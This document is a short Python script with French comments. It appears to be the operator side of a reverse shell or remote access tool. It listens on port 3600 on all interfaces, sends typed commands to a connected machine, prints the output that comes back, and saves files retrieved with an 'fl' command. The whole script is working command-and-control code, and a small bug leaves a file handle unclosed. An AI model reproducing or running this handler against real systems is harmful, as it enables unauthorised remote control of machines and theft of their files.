import socket

PORT , HOST = 3600, "0.0.0.0" # écoute tout les interfaces reseaux
MAX_SIZE = 1024

s = socket.socket()
s.bind((HOST, PORT))
s.listen()
s_use , info_client = s.accept()
print(f"connecté a l'adresse {info_client}")

def socket_recv(sock, data_len):
    compteur_data = 0
    total_data = None
    while compteur_data < data_len:
        len_a_recv = data_len - compteur_data 
        if len_a_recv > MAX_SIZE:
            len_a_recv = MAX_SIZE
        data = sock.recv(len_a_recv)
        if not data :
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        compteur_data += len(data)
    return total_data

def envoi_cmd_recevoir_data(sk, cmd):
    if cmd =="":
        return None
    sk.sendall(cmd.encode())

    len_data = socket_recv(sk, 13)
    longeur = int(len_data.decode())
    data_reçu = socket_recv(sk, longeur)
    return data_reçu   


while True:
    cmd = input('Cams12@$ ')
    data_reçu = envoi_cmd_recevoir_data(s_use, cmd)
    if not data_reçu:
        print('aucune donnée ')
        break
    if cmd =='fin':
        break
    if cmd[:2] == 'fl':
        cd = cmd[3:]
        f = open(cd, 'wb')
        f.write(data_reçu)
        f.close
    else:
        print(data_reçu.decode())

s.close()
s_use.close()
